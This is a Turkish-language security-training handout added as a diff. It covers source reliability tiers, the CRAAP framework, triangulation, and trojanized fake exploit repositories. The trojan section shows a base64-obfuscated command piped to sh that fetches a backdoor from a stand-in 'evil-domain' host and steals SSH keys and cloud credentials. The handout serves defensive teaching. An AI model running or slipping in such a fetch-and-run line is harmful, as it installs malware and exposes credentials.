@@ -1,0 +1,92 @@
+================================================================================
+TEMSİLÎ — AI İLLÜSTRASYONU — GERÇEK TEST DEĞİL
+GÜN 013: Güvenli Araştırma, Kaynak Doğrulama ve CRAAP Güvenilirlik Mimarisi
+Lisans: ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR / Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
+================================================================================
+
++-------------------------------------------------------------------------------+
+|             1. SİBER TEHDİT İSTİHBARATI KAYNAK GÜVENİLİRLİK PİRAMİDİ          |
++-------------------------------------------------------------------------------+
+
+                      /\
+                     /  \     [SEVİYE 1: BİRİNCİL RESMÎ YETKİLİ KAYNAKLAR]
+                    / L1 \    NIST NVD, MITRE ATT&CK, Üretici Güvenlik Bülteni
+                   /------\   (Microsoft MSRC, Cisco PSIRT, Red Hat, RFC)
+                  /        \  Kriptografik İmza: GPG + SHA-256 (Otorite: 95-100)
+                 /    L2    \
+                /------------\ [SEVİYE 2: HAKEMLİ KURUMSAL ARAŞTIRMA LABLARI]
+               /              \ Google Project Zero, Mandiant, Talos, Unit 42
+              /       L3       \ Derin teknik tersine mühendislik (Otorite: 80-90)
+             /------------------\
+            /                    \ [SEVİYE 3: SAYGIN TOPLULUK & KONFERANSLAR]
+           /          L4          \ Black Hat, DEF CON, USENIX, CVE PoC (İncelemeli)
+          /------------------------\ İmzalı teknik sunumlar (Otorite: 65-75)
+         /                          \
+        /             L5             \ [SEVİYE 4: DOĞRULANMAMIŞ FORUM & BLOGLAR]
+       /------------------------------\ Reddit, Eski Forumlar (2011), Medium yazıları
+      /                                \ Hakemsiz, hatalı 'chmod 777' riski (Otorite: 20-40)
+     /               L6                 \
+    /------------------------------------\ [SEVİYE 5: ZEHİRLİ TRUVA ATI / SAHTE PoC]
+                                           Anonim GitHub depoları, Base64 gizli 'curl | sh'
+                                           Tedarik zinciri saldırısı (Otorite: 0 - ZARARLI!)
+
+
++-------------------------------------------------------------------------------+
+|                     2. CRAAP DEĞERLENDİRME ÇERÇEVESİ                          |
++-------------------------------------------------------------------------------+
+
+  [C] CURRENCY   (Güncellik)   ──► Bilgi ne zaman yayınlandı? (>5 yıl ise ESKİ/RİSKLİ)
+  [R] RELEVANCE  (İlgililik)   ──► İncelenen CVE ve hedef sistemle birebir örtüşüyor mu?
+  [A] AUTHORITY  (Otorite)     ──► Yazar/Kurum kim? İtibarı doğrulanabilir mi?
+  [A] ACCURACY   (Doğruluk)    ──► Kanıt var mı? SHA-256 / GPG imzası eşleşiyor mu?
+  [P] PURPOSE    (Amaç/Niyet)  ──► Bilgi koruma amaçlı mı, yoksa tuzak / infostealer mı?
+
+
++-------------------------------------------------------------------------------+
+|              3. ÇAPRAZ TEYİT (SOURCE TRIANGULATION) MEKANİZMASI               |
++-------------------------------------------------------------------------------+
+
+   [Yeni Bir Zaafiyet / Yama / Sertleştirme İddiası Masaya Geldi]
+                                │
+        ┌───────────────────────┴───────────────────────┐
+        ▼                                               ▼
+  [Kaynak A: Resmî Bülten]                      [Kaynak B: Açık Web/Topluluk]
+  - NVD / MSRC / CIS Benchmark                  - Anonim GitHub / Blog
+  - GPG İmzalı, SHA-256 Mevcut                  - İmzasız, Doğrulanmamış
+  - Otorite: 95/100                             - Otorite: 15/100
+        │                                               │
+        └───────────────────────┬───────────────────────┘
+                                ▼
+                 [ÇAPRAZ DOĞRULAMA (Triangulation)]
+                                │
+        ┌───────────────────────┴───────────────────────┐
+        ▼ (Tutarlı ve Doğrulanmış)                      ▼ (Çelişki veya Tuzak)
+  [GÜVENLİ UYGULAMA (Sandbox Lab)]               [DUR! REDDET VE ENGELLE]
+  Resmî kaynaktaki doğrulanmış                   Sahte PoC veya yıkıcı tavsiye
+  SHA-256 ile test laboratuvarında               sistemi enfekte etmeden
+  kontrollü uygulama yapılır.                    karantinaya alınır.
+
+
++-------------------------------------------------------------------------------+
+|       4. SALDIRGAN TUZAĞI: TROJANIZED PoC (ZEHİRLİ İSTİSMAR KODU)             |
++-------------------------------------------------------------------------------+
+
+  [Saldırgan] ──► Yeni çıkan 0-Day / 1-Day için sahte GitHub deposu açar.
+                  Adı: "CVE-2024-XXXX-auto-pwn-exploit.py"
+                  Arama motoru ve Twitter'da SEO zehirlemesi yapar.
+                          │
+                          ▼
+  [Dikkatsiz Araştırmacı] ──► Kodu doğrudan indirip terminalinde çalıştırır:
+                              python exploit.py -t 192.168.1.50
+                                      │
+                                      ▼
+  [Arka Planda Gizli Kod Çalışır]:
+      echo "Y3VybCBodHRwOi8vZXZpbC1kb21haW4vYmFja2Rvb3IgfCBzaA==" | base64 -d | sh
+                                      │
+                                      ▼
+  [SONUÇ]: Araştırmacının SSH anahtarları, AWS kimlikleri ve şifreleri ÇALINDI!
+  [SAVUNMA]: Statik kod analizi + CRAAP doğrulaması + İnternetsiz Sandbox İzolasyonu!
+
+================================================================================
+Bitiş Etiketi: TEMSİLÎ — AI İLLÜSTRASYONU — GERÇEK TEST DEĞİL
+================================================================================
